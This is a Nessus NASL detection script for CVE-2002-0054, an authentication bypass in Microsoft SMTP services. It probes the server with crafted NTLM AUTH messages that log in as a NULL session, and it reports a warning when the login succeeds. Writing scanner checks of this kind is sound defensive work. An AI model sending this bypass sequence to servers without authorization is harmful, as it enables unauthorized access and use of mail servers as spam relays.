#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11308);
 script_bugtraq_id(4205);
 
 script_cve_id("CVE-2002-0054");
 
 script_version ("$Revision: 1.10 $");
 name["english"] = "MS SMTP Authorization bypass";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to authenticate to the remote SMTP service
by logging in as a NULL session.

An attacker may use this flaw to use your SMTP server as a
spam relay.


Solution : http://www.microsoft.com/technet/security/bulletin/MS02-011.mspx
Risk factor : Medium";


 script_description(english:desc["english"]);
		    
 
 summary["english"] = "Checks SMTP authentication";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#


include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 data = smtp_recv_banner(socket:soc); 
 if ( ! data ||  "Microsoft" >!< data  ) exit(0);
 crp = string("HELO example.com\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 if(!(ereg(pattern:"^250 .*", string:data)))exit(0);
 
 send(socket:soc, data:string("AUTH NTLM TlRMTVNTUAABAAAAB4IAgAAAAAAAAAAAAAAAAAAAAAA=\r\n"));
 r = recv_line(socket:soc, length:4096);
 if(!ereg(string:r, pattern:"^334 .*"))exit(0);
 send(socket:soc, data:string("TlRMTVNTUAADAAAAAQABAEAAAAAAAAAAQQAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABBAAAABYIAAAA=\r\n"));
 r = recv_line(socket:soc, length:4096);
 if(ereg(string:r, pattern:"^235 .*"))security_warning(port);
}
